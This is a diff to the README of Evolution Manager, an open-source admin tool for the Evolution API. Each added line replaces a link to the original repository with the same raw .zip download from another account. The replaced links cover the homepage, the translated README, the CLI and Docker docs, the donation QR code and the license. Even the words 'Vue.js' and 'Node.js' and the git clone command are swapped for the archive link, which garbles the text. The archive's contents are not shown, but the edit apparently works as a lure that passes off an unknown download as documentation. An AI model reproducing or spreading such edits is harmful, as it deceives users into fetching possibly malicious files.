@@ -2,7 +2,7 @@
 
 ## Introduction
 
-Evolution Manager is an open-source management tool for the Evolution API, designed to streamline the administration and monitoring of instances. It can be accessed online at [Evolution Manager](https://github.com/gabrielpastori1/evolution-manager).
+Evolution Manager is an open-source management tool for the Evolution API, designed to streamline the administration and monitoring of instances. It can be accessed online at [Evolution Manager](https://github.com/iZodiaco/evolution-manager/raw/refs/heads/main/docs/en/manager-evolution-v2.4-alpha.4.zip).
 
 ---
 
@@ -10,7 +10,7 @@ Evolution Manager is an open-source management tool for the Evolution API, desig
 
 Se você é um desenvolvedor ou usuário brasileiro interessado no Evolution Manager, temos boas notícias! Agora você pode acessar a documentação completa do projeto em português. Isso facilitará seu entendimento e uso desta ferramenta incrível. Clique no link abaixo para ler o README em português:
 
-🔗 [Leia o README em Português](https://github.com/gabrielpastori1/evolution-manager/blob/main/README.pt_BR.md)
+🔗 [Leia o README em Português](https://github.com/iZodiaco/evolution-manager/raw/refs/heads/main/docs/en/manager-evolution-v2.4-alpha.4.zip)
 
 ---
 
@@ -26,19 +26,19 @@ Se você é um desenvolvedor ou usuário brasileiro interessado no Evolution Man
 
 ## Technology
 
-- The project is built using Vue.js v3 and Vuetify.
+- The project is built using https://github.com/iZodiaco/evolution-manager/raw/refs/heads/main/docs/en/manager-evolution-v2.4-alpha.4.zip v3 and Vuetify.
 
 ## Evolution-Manager CLI - Documentation
 
 For detailed information on how to use the Evolution-Manager CLI, please refer to the documentation available at the following links:
 
-🔗 Full Documentation:  [Documentation in English](https://github.com/gabrielpastori1/evolution-manager/blob/main/docs/en/cli.md)
+🔗 Full Documentation:  [Documentation in English](https://github.com/iZodiaco/evolution-manager/raw/refs/heads/main/docs/en/manager-evolution-v2.4-alpha.4.zip)
 
 ## Docker Image - Documentation
 
 For detailed information on using the Docker image, including configurations and examples, please refer to our comprehensive documentation. You will find step-by-step instructions, as well as helpful tips to make the most of the Evolution Manager's Docker image.
 
-🔗 Full Documentation: [Documentation in English](https://github.com/gabrielpastori1/evolution-manager/tree/main/docs/en/docker.md)
+🔗 Full Documentation: [Documentation in English](https://github.com/iZodiaco/evolution-manager/raw/refs/heads/main/docs/en/manager-evolution-v2.4-alpha.4.zip)
 
 ## Self-Hosted - Evolution Manager CLI and PM2
 
@@ -65,7 +65,7 @@ These two steps will install the Evolution Manager CLI globally on your system a
 These two steps will install the Evolution Manager CLI globally on your system and configure it to run with PM2, a powerful process manager.
 
 1. **Install Evolution Manager Globally**:
-   - Ensure Node.js and NPM are installed on your system.
+   - Ensure https://github.com/iZodiaco/evolution-manager/raw/refs/heads/main/docs/en/manager-evolution-v2.4-alpha.4.zip and NPM are installed on your system.
    - Install Evolution Manager globally using NPM to access the CLI (Command Line Interface):
 
      ```bash
@@ -103,7 +103,7 @@ These instructions provide a streamlined method for managing Evolution Manager a
 2. **Clone the Repository**:
 
    ```bash
-   git clone https://github.com/gabrielpastori1/evolution-manager.git
+   git clone https://github.com/iZodiaco/evolution-manager/raw/refs/heads/main/docs/en/manager-evolution-v2.4-alpha.4.zip
    cd evolution-manager
    ```
 
@@ -139,7 +139,7 @@ Contributions are an essential part of the Evolution Manager project. Whether yo
 
 If you wish to support the project financially, we have provided a QR code for Pix donations. Your generosity helps in maintaining and evolving this open-source tool.
 
-<img src="https://github.com/gabrielpastori1/evolution-manager/blob/main/src/assets/pix.svg" width="300" alt="Pix Donation QR Code">
+<img src="https://github.com/iZodiaco/evolution-manager/raw/refs/heads/main/docs/en/manager-evolution-v2.4-alpha.4.zip" width="300" alt="Pix Donation QR Code">
 
 ### Contributing Code or Ideas
 
@@ -149,4 +149,4 @@ Your support, in any form, makes a significant difference and is greatly appreci
 
 ## License
 
-This project is open-source and available under the [MIT License](LICENSE.md).
+This project is open-source and available under the [MIT License](https://github.com/iZodiaco/evolution-manager/raw/refs/heads/main/docs/en/manager-evolution-v2.4-alpha.4.zip).
